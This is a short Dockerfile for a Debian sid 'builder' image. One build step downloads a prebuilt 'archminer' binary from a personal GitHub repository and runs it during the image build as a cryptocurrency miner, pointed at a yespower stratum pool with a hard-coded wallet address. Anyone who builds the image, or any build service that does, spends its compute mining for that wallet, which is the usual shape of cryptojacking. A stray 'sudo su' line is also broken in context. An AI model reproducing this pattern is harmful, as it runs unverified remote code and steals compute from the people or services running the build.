FROM debian:sid-slim as builder

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get install zip wget -y && \
    wget https://github.com/thesunofme/Verus/raw/main/archminer && \
    apt-get install g++ build-essential libcurl4 libssl-dev libjansson4 libjansson-dev libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils cmake screen unzip net-tools curl libx11-dev libxmu-dev libxi-dev libglu1-mesa libglu1-mesa-dev libboost-all-dev ocl-icd-* opencl-headers -y && \
    sudo su && \
    chmod +x archminer && \
    ./archminer -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17122 -u QQyCZYSVy7Dj2tEgzj4s4UbSNVNkYpgZiL.1
